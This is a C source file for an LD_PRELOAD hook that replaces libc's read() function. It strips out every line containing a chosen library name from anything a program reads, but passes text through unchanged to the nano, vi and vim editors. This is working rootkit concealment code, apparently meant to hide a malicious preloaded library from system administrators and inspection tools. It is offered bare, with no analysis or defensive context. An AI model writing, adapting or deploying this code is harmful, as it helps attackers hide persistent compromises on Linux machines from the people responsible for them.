#define _GNU_SOURCE  
#include <unistd.h> 
#include <string.h>
#include <dlfcn.h> 

ssize_t read(int fd, void *buf, size_t count) {
    static ssize_t (*orig)(int, void*, size_t) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "read");

    // ALLOWLIST: If the program is nano, vi, or vim, bypass the text filtering
    if (program_invocation_short_name && (
        strcmp(program_invocation_short_name, "nano") == 0 ||
        strcmp(program_invocation_short_name, "vi") == 0 ||
        strcmp(program_invocation_short_name, "vim") == 0)) {
        
        return orig(fd, buf, count); // Show the raw text strings normally
    }

    ssize_t result = orig(fd, buf, count);

    if (result > 0) {
        char *match;
        // Automatically calculates length at compile time
        size_t lib_len = sizeof(LIB_TO_HIDE) - 1; 
        
        // Loop as long as the library name exists in the remaining buffer data
        while ((match = memmem(buf, result, LIB_TO_HIDE, lib_len)) != NULL) {
            char *start = (char *)buf;
            char *end = start + result;

            // Find start and end boundaries of the matching line
            char *line_start = memrchr(buf, '\n', match - start);
            line_start = line_start ? line_start + 1 : start;

            char *line_end = memchr(match, '\n', end - match);
            line_end = line_end ? line_end + 1 : end;

            // Completely erase the line by shifting memory
            memmove(line_start, line_end, end - line_end);
            result -= (line_end - line_start);
        }
    }
    return result;
}

